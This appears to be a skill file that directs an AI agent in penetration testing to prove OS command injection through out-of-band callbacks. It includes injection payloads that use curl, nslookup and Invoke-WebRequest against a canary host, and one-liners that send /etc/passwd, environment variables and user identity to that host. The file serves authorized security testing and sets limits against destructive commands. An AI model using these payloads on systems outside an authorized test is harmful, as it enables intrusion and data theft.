---
name: command-injection-rce
description: Turn suspected OS command injection (a parameter that lands in a shell or a child process) into proof of remote code execution via an OAST callback, plus one safe demonstration of follow-on impact (read a file, list users, env dump). Use when a parameter feeds an exec/spawn/system call, when payloads with $(), `` ` ``, `;`, `|`, `&&` cause response differences, or when audit flags CWE-78 / CWE-77. Never sends destructive commands.
license: MIT
allowed-tools:
  - query_records
  - inspect_record
  - replay_request
  - oast_mint
  - oast_poll
  - attack_kit
  - report_finding
  - update_finding
  - remember
  - update_plan
---

# Command Injection → RCE Proof

You have a parameter that smells like it lands in a shell or process
exec call. Your job is to prove arbitrary command execution by getting
an OAST callback from the server, then demonstrate one minimal
follow-on action (a file read, an env dump). Reporting "the response
changed when I sent `;`" is not enough.

## When this skill applies

- A parameter feeds something likely to exec: `cmd=`, `host=` (ping),
  `target=` (traceroute), `file=` (image conversion, PDF render,
  zip/tar), `filter=`, `format=` (ffmpeg, imagemagick), `name=` on a
  user-management endpoint that shells out.
- Response differs when you send characters that have shell meaning:
  `;`, `|`, `&`, `&&`, `||`, `` ` ``, `$(...)`, `\n`.
- A 500 error message reveals a binary name (`sh`, `bash`, `convert`,
  `ffmpeg`, `ImageMagick`, `node`, `python`, `php`) in the stack
  trace or response body.
- Audit finding: CWE-78 (OS command injection), CWE-77 (command
  injection), CWE-94 (code injection).

## Workflow

### 1. Confirm a shell metacharacter changes behavior

Pick a candidate parameter from `query_records` + `inspect_record`.
Send three `replay_request` probes:

- Baseline: harmless value (e.g. `8.8.8.8` for a ping endpoint).
- `8.8.8.8;` → trailing separator. Status / length differential?
- `8.8.8.8 && echo hi` → does `hi` appear in the response, or does
  the response take longer?

If none of these change the response, the parameter is probably
sanitized or doesn't shell out. Stop and pick another candidate.

`remember` the candidate parameter and which metacharacter triggered
the differential (key: `cmdinj-target`).

### 2. Confirm execution via OAST

Mint a canary with `oast_mint` (kind: `cmdinj-probe`). Inject a payload
that performs a DNS or HTTP request to the canary. Choose the encoding
by the suspected OS / language:

- **Generic shell**: `value; curl <canary>` or `value && nslookup <canary>`
- **Backticks**: `value`` `curl <canary>` `` (works in `sh`/`bash`).
- **`$()` substitution**: `value$(curl <canary>)`.
- **Windows cmd.exe**: `value & nslookup <canary>` (note the single `&`).
- **PowerShell**: `value; Invoke-WebRequest <canary>`.

Use `attack_kit` with `class: "cmd-injection"` to pull canonical
payload patterns for the parameter's encoding (URL vs JSON vs header).

Poll `oast_poll` for 60 seconds. The first DNS or HTTP callback proves
execution. **DNS-only is still proof** (most internal hosts can resolve
external names even when HTTP egress is blocked).

`remember` the callback proof (timestamp, payload, callback URL) with
key `cmdinj-proof`.

### 3. One follow-on demonstration

Once RCE is proven, send ONE additional payload to size impact. Pick
the cheapest demo that establishes "the attacker has hands on the box":

- File read: `; curl <canary>?d=$(cat /etc/passwd | base64)` (base64
  to survive DNS encoding; expect truncation).
- Env dump: `; env | curl --data-binary @- <canary>`
- Hostname / user: `; (whoami; hostname; id) | curl --data-binary @- <canary>`

Wait for the callback. Decode the leaked data (base64 if you used it).
**Include ONE line of the leaked data** in the finding — not the whole
`/etc/passwd`.

**Do not run destructive commands**: no `rm`, no `> /etc/...`, no
package installs, no port scans, no reverse shells, no persistent
mechanisms. The callback + one small data fetch is sufficient proof.

### 4. Persist the finding

`report_finding`:

- `severity`: `critical` — OS command execution on the server is
  always critical regardless of what you leaked.
- `title`: name the endpoint, parameter, and the proof: `"OS command
  injection in /api/render filter parameter; OAST callback + reads
  /etc/passwd"`.
- `cwe_id`: CWE-78.
- `description`: 3-4 sentences. The endpoint, the trigger
  metacharacter, the OAST callback timestamp, and one masked line of
  the follow-on demo (e.g., `"first /etc/passwd line: root:x:0:0:..."`).
- Include the exact payload that triggered the callback.

## Pitfalls

- A response delay when you send `; sleep 5` is *suggestive* but not
  proof — networking jitter and shared rate limiters cause similar
  delays. Require an OAST callback before claiming RCE.
- Some sandboxes (gVisor, nsjail) restrict egress; DNS-only callbacks
  may be all you get. Note that explicitly in the finding.
- Image processors (`convert`, `ffmpeg`) sometimes have shell
  injection via filenames or annotation fields — these surfaces are
  less obvious than `cmd=`; check filenames.
- Argument-injection (without shell) is a related but distinct flaw —
  `--config=/etc/passwd` against a tool that reads `--config` files.
  Still report as CWE-77 / CWE-78 if it leaks data.
- If the callback URL is base64-encoded data, decode and read it
  before reporting — sometimes the payload encoding garbled the data
  in transit and what you have is just truncated noise, not proof.

## Output expectations

- One `report_finding` (critical) with payload + callback timestamp +
  one masked line of leaked data.
- A `remember` note (key: `cmdinj-proof`) with the canonical payload.
- Plan item marked `done`.
